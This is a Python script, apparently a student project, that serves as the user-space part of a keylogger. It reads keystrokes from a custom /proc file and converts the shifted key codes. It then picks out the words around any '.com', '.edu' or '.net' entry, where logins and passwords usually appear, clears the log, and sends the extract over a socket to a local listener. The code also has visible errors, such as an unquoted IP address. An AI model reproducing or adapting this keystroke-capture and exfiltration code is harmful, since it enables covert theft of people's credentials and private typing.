from bs4 import BeautifulSoup
import socket
# extracted table from http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
def convertWord(oldWord, hasht):
    neword = ""
    for i in oldWord:
        if i in hasht:
            neword += hasht[i]
        else:
            neword += i
    return neword

hashtable = {}
soup = BeautifulSoup(open('table.html'),'html.parser')
all_trs = soup.find_all('tr')
all_trs = all_trs[1:]
for tr in all_trs: 
    all_tds = tr.find_all('td')
    val = all_tds[0].text.lower().replace(" ","")
    if len(val) < 2:
        shiftval = (all_tds[5].text.replace(" ",""))
        if len(shiftval) > 1:
            hashtable[val] = shiftval[0]
        else:
            hashtable[val] = shiftval

print(hashtable)


save = ""
# read data from 'proc file' 
with open('/proc/proj/status','r') as f:
    for fline in f:
        save += fline


left = None
newstr = ""
new_words = save.split()
for word in new_words:
    if word == "rshiftd" or word == "lshiftd":
        left = True
    elif left and word != "rshiftu" and word != "lshiftu":
        newword = convertWord(word,hashtable)
        newstr += newword
    elif left and (word == "rshiftu" or word == "lshiftu"):
        newstr += " "
        left = None
    elif word != "space":
        newstr += " {}".format(word)
    
print(save)

# check if .com in word or .edu in word or .net 
indxs = []
shiftedarr = newstr.split()
for idx,val in enumerate(shiftedarr):
    if ".com" in val or ".edu" in val or ".net" in val:
        indxs.append(idx) 
strs = ""
for i in indxs: ## finds .com and gets 5 words before and 5 after for important info
    if i < 5:
        packUp = shiftedarr[0:i] + shiftedarr[i:i+5]
        for indiv in packUp:
            strs += "{} ".format(indiv)
        strs += " --MSG\n"
    else:
        packUp = shiftedarr[(i-5):i] + shiftedarr[i:(i+5)]
        for indiv in packUp:
            strs += "{} ".format(indiv)
        strs += " --MSG\n"

print(strs)

with open('/proc/proj/status',"w") as f:
    f.write("w")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((127.0.0.1,5000))
s.send(strs)
s.close()
